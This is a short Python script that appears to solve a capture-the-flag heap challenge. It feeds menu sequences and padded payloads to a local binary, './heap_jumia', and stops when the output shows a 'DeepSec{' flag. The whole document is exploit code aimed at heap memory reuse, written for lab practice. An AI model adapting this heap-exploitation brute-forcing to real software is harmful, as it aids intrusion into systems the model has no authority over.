#!/usr/bin/env python3
import subprocess, time

BIN = './heap_jumia'

# payload base: 30 filler then candidate marker
fill = b'A'*30
marker = b'w3th4nds'

# try a few sequences and sizes
sequences = [
    ['2','1','3'],
    ['1','2','3'],
    ['2','1','1','3'],
    ['1','1','2','3'],
]

sizes = [0x26]  # exact same size as global allocation

for seq in sequences:
    for size in sizes:
        for offset in range(0,40):
            filler = b'A'*offset
            payload = filler + marker
            if len(payload) > size:
                payload = payload[:size]
            elif len(payload) < size:
                payload = payload + b'B'*(size - len(payload))
            inp_parts = []
            for cmd in seq:
                if cmd == '1':
                    inp_parts.append(cmd.encode()+b'\n')
                    inp_parts.append(str(size).encode()+b'\n')
                    inp_parts.append(payload+b'\n')
                elif cmd == '2' or cmd == '3':
                    inp_parts.append(cmd.encode()+b'\n')
                else:
                    inp_parts.append(cmd.encode()+b'\n')
            inp = b''.join(inp_parts)
            p = None
            try:
                p = subprocess.run([BIN], input=inp, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=2)
                out = p.stdout.decode(errors='ignore')
            except Exception as e:
                out = str(e)
            if 'DeepSec{' in out:
                print('FOUND with seq',seq,'size',size,'offset',offset)
                print(out)
                raise SystemExit

print('done')
